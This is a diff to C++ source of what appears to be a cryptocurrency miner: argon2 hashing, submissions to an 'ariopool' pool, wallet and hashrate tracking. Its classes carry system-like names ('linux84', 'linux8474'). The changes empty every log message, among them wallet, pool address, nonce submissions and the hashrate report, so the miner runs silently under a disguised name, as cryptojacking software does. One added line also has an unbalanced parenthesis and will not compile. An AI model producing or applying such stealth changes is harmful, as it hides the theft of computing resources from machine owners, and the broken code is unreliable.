@@ -31,9 +31,9 @@ linux84::linux84(arguments &args) : __args(args), __client(args, [&]() { return 
     __running = false;
     __display_hits = 0;
 
-    LOG("linux84 name: " + __args.name());
-    LOG("Wallet: " + __args.wallet());
-    LOG("Pool address: " + __args.pool());
+    LOG(""));
+    LOG("");
+    LOG("");
 
     vector<linux8474*> linux8474s = linux8474::get_linux8474s();
 	for (vector<linux8474*>::iterator it = linux8474s.begin(); it != linux8474s.end(); ++it) {
@@ -41,8 +41,8 @@ linux84::linux84(arguments &args) : __args(args), __client(args, [&]() { return 
 			if ((*it)->initialize()) {
 				(*it)->configure(__args);
 			}
-			LOG("Compute unit: " + (*it)->get_type());
-			LOG((*it)->get_info());
+			LOG("");
+			LOG("");
 		}
 	}
 
@@ -69,12 +69,12 @@ linux84::linux84(arguments &args) : __args(args), __client(args, [&]() { return 
             if ((*it)->initialize()) {
                 (*it)->configure(__args);
             }
-            LOG("Compute unit: " + (*it)->get_type() + " - " + (*it)->get_subtype());
-            LOG((*it)->get_info());
+            LOG("");
+            LOG("");
         }
 	}
 
-	LOG("\n");
+	LOG("");
 
     __update_pool_data();
     vector<linux8474*> active_linux8474s = linux8474::get_active_linux8474s();
@@ -98,7 +98,7 @@ void linux84::run() {
     vector<linux8474 *> linux8474s = linux8474::get_active_linux8474s();
 
     if(linux8474s.size() == 0) {
-        LOG("No linux8474s available. Exiting.");
+        LOG("");
     }
     else {
         __running = true;
@@ -120,14 +120,14 @@ void linux84::run() {
                 uint64_t result = linux84::calc_compare(duration, __difficulty);
                 if (result > 0 && result <= __limit) {
                     if (__args.is_verbose())
-                        LOG("--> Submitting nonce: " + hash->nonce + " / " + hash->hash.substr(30));
+                        LOG("");
                     ariopool_submit_result reply = __client.submit(hash->hash, hash->nonce, __public_key);
                     if (reply.success) {
                         if (result <= GOLD_RESULT) {
-                            if (__args.is_verbose()) LOG("--> Block found.");
+                            if (__args.is_verbose()) LOG("");
                             __found++;
                         } else {
-                            if (__args.is_verbose()) LOG("--> Nonce confirmed.");
+                            if (__args.is_verbose()) LOG("");
                             if(__argon2profile == "1_1_524288")
                                 __confirmed_cblocks++;
                             else
@@ -135,9 +135,9 @@ void linux84::run() {
                         }
                     } else {
                         if (__args.is_verbose()) {
-                            LOG("--> The nonce did not confirm.");
-                            LOG("--> Pool response: ");
-                            LOG(reply.pool_response);
+                            LOG("");
+                            LOG("");
+                            LOG("");
                         }
                         if(__argon2profile == "1_1_524288")
                             __rejected_cblocks++;
@@ -303,15 +303,15 @@ bool linux84::__display_report() {
 
             if(__argon2profile == "1_1_524288") {
                 if(d->second.cblock_hashrate < 999)
-                    log << "|" << fixed << setprecision(1) << setw(5) << d->second.cblock_hashrate;
+                    log << "";
                 else
-                    log << "|" << fixed << setw(5) << (int)d->second.cblock_hashrate;
+                    log << "";
             }
             else
-                log << "|" << setw(5) << (int)(d->second.gblock_hashrate);
+                log << "";
         }
     }
-    header << "|Avg(C)|Avg(G)|     Time|Acc(C)|Acc(G)|Rej(C)|Rej(G)|Block|";
+    header << "";
     log << "|" << setw(6) << (int)avg_hash_rate_cblocks
             << "|" << setw(6) << (int)avg_hash_rate_gblocks
             << "|" << setw(9) << format_seconds(total_time)
